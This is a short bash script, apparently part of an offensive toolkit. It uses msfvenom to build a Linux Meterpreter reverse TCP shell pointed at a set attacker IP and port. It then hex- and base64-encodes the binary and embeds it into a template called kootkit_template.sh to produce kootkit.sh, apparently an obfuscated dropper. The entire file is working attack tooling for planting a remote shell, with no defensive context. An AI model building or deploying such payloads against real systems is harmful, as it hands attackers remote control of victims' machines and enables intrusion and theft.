#!/bin/bash

set -e -x

ATTACKER_IP=192.168.1.107
ATTACKER_PORT=4444

# temp meterpreter reverse tcp shell binary 
TEMP_MRT=mrt

# generate meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LPORT=$ATTACKER_PORT LHOST=$ATTACKER_IP -f elf -o $TEMP_MRT &> /dev/null

# thanks to http://blog.nsfocus.net/unconventional-means-uploading-downloading-binary-files/
PAYLOAD=$(xxd -p $TEMP_MRT | tr -d '\n' | base64 -w 0)

sed "s/PAYLOAD_VALUE_BASE64/$PAYLOAD/g" kootkit_template.sh > kootkit.sh
